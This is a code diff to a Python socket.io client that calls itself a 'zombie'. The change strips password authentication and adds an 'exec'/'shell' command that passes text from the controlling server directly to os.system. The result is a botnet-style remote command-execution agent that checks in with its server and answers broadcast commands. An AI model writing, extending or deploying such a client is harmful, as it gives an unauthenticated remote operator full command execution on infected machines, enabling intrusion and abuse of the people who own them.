@@ -1,49 +1,38 @@
 import socketio
-import json
-import bcrypt
 import os
-from dotenv import load_dotenv
 
 sio = socketio.Client()
-
-load_dotenv()
-
-password = os.getenv('PASSWORD')
 
 @sio.event
 def connect():
     print('Connection established')
+    sio.emit('message', 'message Hello from zombie!')
 
-    command = 'send Hello, this is a test message'
+def ping(args):
+    sio.emit('message', 'message Pinged zombie!')
 
-    data = {
-        "auth": str(password), 
-        "command": command  
-    }
-
-    json_data = json.dumps(data)
-
-    sio.emit('message', json_data)
-    
-def ping():
-    sio.emit('message', 'Pinged zombie!')
+def shell(args):
+    return os.system(' '.join(args[1:]))
 
 @sio.event
 def message(data):
     print('Message from server:', data)
+    command = data.split(' ')
     
-    command=data.split(' ')
-    
-    commands=[
+    commands = [
         {
             'name': ['ping', 'check', 'hello'],
-            'callback': ping
+            'callback': ping,
+        },
+        {
+            'name': ['exec', 'shell'],
+            'callback': shell,
         }
     ]
     
     for cmd in commands:
-        if data[0] in cmd['name']:
-            cmd['callback']()
+        if command[0].replace('-all', '') in cmd['name']:
+            cmd['callback'](command)
 
 @sio.event
 def disconnect():
